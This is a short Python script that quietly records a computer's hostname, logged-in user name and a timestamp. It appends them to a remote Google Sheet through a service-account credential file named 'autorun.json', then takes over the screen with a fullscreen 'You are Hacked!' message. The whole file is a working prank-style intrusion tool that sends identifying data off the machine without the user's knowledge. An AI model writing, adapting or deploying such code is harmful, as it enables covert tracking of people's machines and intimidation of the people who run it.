import datetime
import tkinter
import gspread
import socket
import os
from tkinter import *


pc_name = socket.gethostname()
user_name =os.getlogin()

current_dt = datetime.datetime.now()
dt_string = current_dt.strftime("%d/%m/%Y %H:%M:%S")

sa = gspread.service_account(filename="autorun.json")
sh = sa.open("sheet-name")
wks = sh.worksheet("sheet-name")

data =[pc_name, user_name, dt_string]
wks.append_row(data)

win = Tk()
win.geometry("650x250")
Label(win, text ="You are Hacked!", fg='Dark Green', font=('Calibri', 80)).pack(padx=10, pady=300)
win.attributes('-fullscreen', True)

win.mainloop()




